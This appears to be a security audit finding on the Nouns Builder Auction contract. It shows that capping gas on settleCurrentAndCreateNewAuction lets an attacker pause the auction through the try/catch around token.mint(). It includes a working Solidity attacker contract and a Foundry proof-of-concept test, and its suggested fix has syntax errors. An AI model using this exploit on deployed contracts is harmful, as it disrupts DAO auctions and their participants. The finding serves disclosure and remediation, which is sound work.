Deep Ivory Cheetah

medium

# Attacker can force pause the Auction contract.

## Summary
In certain situations (e.g founders have ownership percentage greater than 51) an attacker can potentially exploit the `try catch`  within the `Auction._CreateAuction()` function to arbitrarily pause the auction contract.
## Vulnerability Detail
Consider the code from `Auction._CreateAuction()` function, which is called by `Auction.settleCurrentAndCreateNewAuction()`. It first tries to mint a new token for the auction, and if the minting fails the `catch` branch will be triggered, pausing the auction.

```solidity
function _createAuction() private returns (bool) {
	// Get the next token available for bidding
	try token.mint() returns (uint256 tokenId) {
		// Store the token id
		auction.tokenId = tokenId;

		// Cache the current timestamp
		uint256 startTime = block.timestamp;

		// Used to store the auction end time
		uint256 endTime;

		// Cannot realistically overflow
		unchecked {
			// Compute the auction end time
			endTime = startTime + settings.duration;
		}

		// Store the auction start and end time
		auction.startTime = uint40(startTime);
		auction.endTime = uint40(endTime);

		// Reset data from the previous auction
		auction.highestBid = 0;
		auction.highestBidder = address(0);
		auction.settled = false;

		// Reset referral from the previous auction
		currentBidReferral = address(0);

		emit AuctionCreated(tokenId, startTime, endTime);
		return true;
	} catch {
		// Pause the contract if token minting failed
		_pause();
		return false;
	}
}
```

Due to the internal logic of the mint function, if there are founders with high ownership percentages, many tokens can be minted to them during calls to `mint`as part of the vesting mechanism. As a consequence of this under some circumstances calls to `mint` can consume huge amounts of gas.

Currently on Ethereum and EVM-compatible chains, calls can consume at most 63/64 of the parent's call gas (See [EIP-150](https://eips.ethereum.org/EIPS/eip-150)). An attacker can exploit this circumstances of high gas cost to restrict the parent gas call limit, making `token.mint()` fail and still leaving enough gas left (1/64) for the `_pause()` call to succeed. Therefore he is able to force the pausing of the auction contract at will.

Based on the gas requirements (1/64 of the gas calls has to be enough for `_pause()` gas cost of 21572), then `token.mint()` will need to consume at least 1359036 gas (63 * 21572), consequently it is only possible on some situations like founders with high percentage of vesting, for example 51 or more.

Consider the following POC. Here we are using another contract to restrict the gas limit of the call, but this can also be done with an EOA call from the attacker.

Exploit contract code:
```solidity
pragma solidity ^0.8.16;

contract Attacker {
    function forcePause(address target) external {
        bytes4 selector = bytes4(keccak256("settleCurrentAndCreateNewAuction()"));
        assembly {
            let ptr := mload(0x40)
            mstore(ptr,selector)
            let success := call(1500000, target, 0, ptr, 4, 0, 0)
        }
    }
}
```

POC:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.16;

import { NounsBuilderTest } from "./utils/NounsBuilderTest.sol";
import { MockERC721 } from "./utils/mocks/MockERC721.sol";
import { MockImpl } from "./utils/mocks/MockImpl.sol";
import { MockPartialTokenImpl } from "./utils/mocks/MockPartialTokenImpl.sol";
import { MockProtocolRewards } from "./utils/mocks/MockProtocolRewards.sol";
import { Auction } from "../src/auction/Auction.sol";
import { IAuction } from "../src/auction/IAuction.sol";
import { AuctionTypesV2 } from "../src/auction/types/AuctionTypesV2.sol";
import { TokenTypesV2 } from "../src/token/types/TokenTypesV2.sol";
import { Attacker } from "./Attacker.sol";

contract AuctionTest is NounsBuilderTest {
    MockImpl internal mockImpl;
    Auction internal rewardImpl;
    Attacker internal attacker;
    address internal bidder1;
    address internal bidder2;
    address internal referral;
    uint16 internal builderRewardBPS = 300;
    uint16 internal referralRewardBPS = 400;

    function setUp() public virtual override {
        super.setUp();
        bidder1 = vm.addr(0xB1);
        bidder2 = vm.addr(0xB2);
        vm.deal(bidder1, 100 ether);
        vm.deal(bidder2, 100 ether);
        mockImpl = new MockImpl();
        rewardImpl = new Auction(address(manager), address(rewards), weth, builderRewardBPS, referralRewardBPS);
        attacker = new Attacker();
    }

    function test_POC() public {
        // START OF SETUP
        address[] memory wallets = new address[](1);
        uint256[] memory percents = new uint256[](1);
        uint256[] memory vestingEnds = new uint256[](1);
        wallets[0] = founder;
        percents[0] = 99;
        vestingEnds[0] = 4 weeks;
        //Setting founder with high percentage ownership.
        setFounderParams(wallets, percents, vestingEnds);
        setMockTokenParams();
        setMockAuctionParams();
        setMockGovParams();
        deploy(foundersArr, tokenParams, auctionParams, govParams);
        setMockMetadata();
        // END OF SETUP

        // Start auction contract and do the first auction
        vm.prank(founder);
        auction.unpause();
        vm.prank(bidder1);
        auction.createBid{ value: 0.420 ether }(99);
        vm.prank(bidder2);
        auction.createBid{ value: 1 ether }(99);

        // Move block.timestamp so auction can end.
        vm.warp(10 minutes + 1 seconds);

        //Attacker calls the auction
        attacker.forcePause(address(auction));

        //Check that auction was paused.
        assertEq(auction.paused(), true);
    }
}
```

## Impact
Should the conditions mentioned above be met, an attacker can arbitrarily pause the auction contract, effectively interrupting the DAO auction process. This pause persists until owners takes subsequent actions to unpause the contract. The attacker can exploit this vulnerability repeatedly.
## Code Snippet

https://github.com/sherlock-audit/2023-09-nounsbuilder/blob/main/nouns-protocol/src/auction/Auction.sol#L238-L241

https://github.com/sherlock-audit/2023-09-nounsbuilder/blob/main/nouns-protocol/src/auction/Auction.sol#L292-L329

## Tool used

Manual Review

## Recommendation
Consider better handling the possible errors from `Token.mint()`, like shown below:

```solidity
  function _createAuction() private returns (bool) {
      // Get the next token available for bidding
      try token.mint() returns (uint256 tokenId) {
          //CODE OMMITED
      } catch (bytes memory err) {
          // On production consider pre-calculating the hash values to save gas
          if (keccak256(abi.encodeWithSignature("NO_METADATA_GENERATED()")) == keccak256(err)) {
              _pause();
              return false
          } else if (keccak256(abi.encodeWithSignature("ALREADY_MINTED()") == keccak256(err)) {
              _pause();
              return false
          } else {
              revert OUT_OF_GAS();
          }
      } 
```